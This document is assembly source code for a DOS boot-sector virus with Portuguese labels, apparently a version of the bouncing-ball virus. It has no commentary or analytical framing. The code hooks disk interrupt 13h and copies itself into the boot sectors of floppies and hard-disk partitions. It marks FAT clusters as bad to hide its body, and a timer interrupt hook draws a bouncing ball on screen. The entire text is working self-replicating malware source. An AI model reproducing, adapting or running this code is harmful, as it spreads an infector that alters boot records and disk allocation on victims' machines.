.RADIX 16

jmpf    macro   x
        db      0eah
        dd      x
endm

Virus       SEGMENT
assume  cs:virus;ds:virus

jmpf    MACRO   x
        db      0eah
        dd      x
ENDM

org 0100h

begin:  jmp     short entry

                db      1eh-2 dup (?)

entry:  xor     ax,ax
        mov     ss,ax
        mov     sp,7c00
        mov     ds,ax
        mov     ax,ds:[0413]
        sub     ax,2
        mov     ds:[0413],ax
        mov     cl,06
        shl     ax,cl
        sub     ax,07c0
        mov     es,ax
        mov     si,7c00
        mov     di,si
        mov     cx,0100
        repz    movsw
        mov     cs,ax
        push    cs
        pop     ds
        call    reset
reset:  xor     ah,ah
        int     13
        and     byte ptr ds:drive,80
        mov     bx,ds:sector
        push    cs
        pop     ax
        sub     ax,0020
        mov     es,ax
        call    ler_sector
        mov     bx,ds:sector
        inc     bx
        mov     ax,0ffc0
        mov     es,ax
        call    ler_sector
        xor     ax,ax
        mov     ds:estado,al
        mov     ds,ax
        mov     ax,ds:[004c]
        mov     bx,ds:[004e]
        mov     word ptr ds:[004c],offset int_13
        mov     ds:[004e],cs
        push    cs
        pop     ds
        mov     word ptr ds:velho_13,ax
        mov     word ptr ds:velho_13+2,bx
        mov     dl,ds:drive
        jmpf    0:7c00

Esc_Sector      proc    near
                mov     ax,0301
                jmp     short cs:transferir
Esc_Sector      endp

Ler_Sector  proc  near
            mov ax,0201
Ler_Sector  endp

Transferir  proc  near
            xchg    ax,bx
            add     ax,ds:[7c1c]
            xor     dx,dx
            div     ds:[7c18]
            inc     dl
            mov     ch,dl
            xor     dx,dx
            div     ds:[7c1a]
            mov     cl,06
            shl     ah,cl
            or      ah,ch
            mov     cx,ax
            xchg    ch,cl
            mov     dh,dl
            mov     ax,bx
transf:     mov     dl,ds:drive
            mov     bx,8000
            int     13
            jnb     trans_exit
            pop     ax
trans_exit: ret
Transferir  endp

Int_13      proc    near
            push    ds
            push    es
            push    ax
            push    bx
            push    cx
            push    dx
            push    cs
            pop     ds
            push    cs
            pop     es
            test    byte ptr ds:estado,1
            jnz     call_BIOS
            cmp     ah,2
            jnz     call_BIOS
            cmp     ds:drive,dl
            mov     ds:drive,dl
            jnz     outra_drv
            xor     ah,ah
            int     1a
            test    dh,7f
            jnz     nao_desp
            test    dl,0f0
            jnz     nao_desp
            push    dx
            call    despoletar
            pop     dx
nao_desp:   mov     cx,dx
            sub     dx,ds:semente
            mov     ds:semente,cx
            sub     dx,24
            jb      call_BIOS
outra_drv:  or      byte ptr ds:estado,1
            push    si
            push    di
            call    contaminar
            pop     di
            pop     si
            and     byte ptr ds:estado,0fe
call_BIOS:  pop     dx
            pop     cx
            pop     bx
            pop     ax
            pop     es
            pop     ds
Velho_13    equ     $+1
            jmpf    0:0
Int_13      endp

Contaminar  proc    near
            mov     ax,0201
            mov     dh,0
            mov     cx,1
            call    transf
            test    byte ptr ds:drive,80
            jz      testar_drv
            mov     si,81be
            mov     cx,4
proximo:    cmp     byte ptr [si+4],1
            jz      ler_sect
            cmp     byte ptr [si+4],4
            jz      ler_sect
            add     si,10
            loop    proximo
            ret

ler_sect:   mov     dx,[si]
            mov     cx,[si+2]
            mov     ax,0201
            call    transf
testar_drv: mov     si,8002
            mov     di,7c02
            mov     cx,1c
            repz    movsb
            cmp     word ptr ds:[offset flag+0400],1357
            jnz     esta_limpa
            cmp     byte ptr ds:flag_2,0
            jnb     tudo_bom
            mov     ax,word ptr ds:[offset prim_dados+0400]
            mov     ds:prim_dados,ax
            mov     si,ds:[offset sector+0400]
            jmp     infectar
tudo_bom:   ret

esta_limpa:     cmp     word ptr ds:[800bh],0200
                jnz     tudo_bom
                cmp     byte ptr ds:[800dh],2
                jb      tudo_bom
                mov     cx,ds:[800e]
                mov     al,byte ptr ds:[8010]
                cbw
                mul     word ptr ds:[8016]
                add     cx,ax
                mov     ax,' '
                mul     word ptr ds:[8011]
                add     ax,01ff
                mov     bx,0200
                div     bx
                add     cx,ax
                mov     ds:prim_dados,cx
                mov     ax,ds:[7c13]
                sub     ax,ds:prim_dados
                mov     bl,byte ptr ds:[7c0dh]
                xor     dx,dx
                xor     bh,bh
                div     bx
                inc     ax
                mov     di,ax
                and     byte ptr ds:estado,0fbh
                cmp     ax,0ff0
                jbe     sao_3
                or      byte ptr ds:estado,4
sao_3:  mov     si,1
                mov     bx,ds:[7c0e]
                dec     bx
                mov     ds:inf_sector,bx
                mov     byte ptr ds:FAT_sector,0fe
                jmp     short continua

Inf_Sector      dw      1
Prim_Dados  dw    0c
Estado  db      0
Drive           db      1
Sector  dw      0ec
Flag_2  db      0
Flag            dw      1357
                dw      0aa55

continua:       inc     word ptr ds:inf_sector
                mov     bx,ds:inf_sector
                add     byte ptr ds:[FAT_sector],2
                call    ler_sector
                jmp     short   l7e4b

verificar:      mov     ax,3
                test    byte ptr ds:estado,4
                jz      l7e1d
                inc     ax
l7e1d:  mul     si
                shr     ax,1
                sub     ah,ds:FAT_sector
                mov     bx,ax
                cmp     bx,01ff
                jnb     continua
                mov     dx,[bx+8000]
                test    byte ptr ds:estado,4
                jnz     l7e45
                mov     cl,4
                test    si,1
                jz      l7e42
                shr     dx,cl
l7e42:  and     dh,0f
l7e45:  test    dx,0ffff
                jz      l7e51
l7e4b:  inc     si
                cmp     si,di
                jbe     verificar
                ret

l7e51:  mov     dx,0fff7
                test    byte ptr ds:estado,4
                jnz     l7e68
                and     dh,0f
                mov     cl,4
                test    si,1
                jz      l7e68
                shl     dx,cl
l7e68:  or      [bx+8000],dx
                mov     bx,word ptr ds:inf_sector
                call    esc_sector
                mov     ax,si
                sub     ax,2
                mov     bl,ds:7c0dh
                xor     bh,bh
                mul     bx
                add     ax,ds:prim_dados
                mov     si,ax
                mov     bx,0
                call    ler_sector
                mov     bx,si
                inc     bx
                call    esc_sector
infectar:       mov     bx,si
                mov     word ptr ds:sector,si
                push    cs
                pop     ax
                sub     ax,20
                mov     es,ax
                call    esc_sector
                push    cs
                pop     ax
                sub     ax,40
                mov     es,ax
                mov     bx,0
                call    esc_sector
                ret
Contaminar      endp

Semente dw      ?

FAT_sector      db    0



Despoletar      proc    near
              test  byte ptr ds:estado,2
            jnz   desp_exit
            or    byte ptr ds:estado,2
                mov     ax,0
                mov     ds,ax
                mov     ax,ds:20
                mov     bx,ds:22
                mov     word ptr ds:20,offset int_8
                mov     ds:22,cs
                push    cs
                pop     ds
                mov     word ptr ds:velho_8+8,ax
                mov     word ptr ds:velho_8+2,bx
desp_exit:      ret
Despoletar      endp

Int_8           proc    near
              push      ds
                push    ax
                push    bx
                push    cx
                push    dx
                push    cs
                pop     ds
                mov     ah,0f
                int     10
                mov     bl,al
                cmp     bx,ds:modo_pag
                jz      ler_cur
                mov     ds:modo_pag,bx
                dec     ah
                mov     ds:colunas,ah
                mov     ah,1
                cmp     bl,7
                jnz     e_CGA
                dec     ah
e_CGA:  cmp     bl,4
                jnb     e_grafico
                dec     ah
e_grafico:      mov     ds:muda_attr,ah
                mov     word ptr ds:coordenadas,0101
                mov     word ptr ds:direccao,0101
                mov     ah,3
                int     10
                push    dx
                mov     dx,ds:coordenadas
                jmp     short   limites

ler_cur:        mov     ah,3
                int     10
                push    dx
                mov     ah,2
                mov     dx,ds:coordenadas
                int     10
                mov     ax,ds:carat_attr
                cmp     byte ptr ds:muda_attr,1
                jnz     mudar_atr
                mov     ax,8307
mudar_atr:      mov     bl,ah
                mov     cx,1
                mov     ah,9
                int     10
limites:        mov     cx,ds:direccao
                cmp     dh,0
                jnz     linha_1
                xor     ch,0ff
                inc     ch
linha_1:        cmp     dh,18
                jnz     coluna_1
                xor     ch,0ff
                inc     ch
coluna_1:       cmp     dl,0
                jnz     coluna_2
                xor     cl,0ff
                inc     cl
coluna_2:       cmp     dl,ds:colunas
                jnz     esta_fixe
                xor     cl,0ff
                inc     cl
esta_fixe:      cmp     cx,ds:direccao
                jnz     act_bola
                mov     ax,ds:carat_attr
                and     al,7
                cmp     al,3
                jnz     nao_e
                xor     ch,0ff
                inc     ch
nao_e:  cmp     al,5
                jnz     act_bola
                xor     cl,0ff
                inc     cl
act_bola:       add     dl,cl
                add     dh,ch
                mov     ds:direccao,cx
                mov     ds:coordenadas,dx
                mov     ah,2
                int     10
                mov     ah,8
                int     10
                mov     ds:carat_attr,ax
                mov     bl,ah
                cmp     byte ptr ds:muda_attr,1
                jnz     nao_muda
                mov     bl,83
nao_muda:       mov     cx,1
                mov     ax,0907
                int     10
                pop     dx
                mov     ah,2
                int     10
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     ds
velho_8 equ     $+1
                jmpf    0:0
Int_8           endp

Carat_attr      dw      ?       ; 7fcd
Coordenadas     dw      0101  ; 7fcf
Direccao        dw      0101  ; 7fd1
Muda_attr       db      1       ; 7fd3
Modo_pag        dw      ?       ; 7fd4
Colunas db      ?       ; 7fd6

Virus           ENDS

END             begin

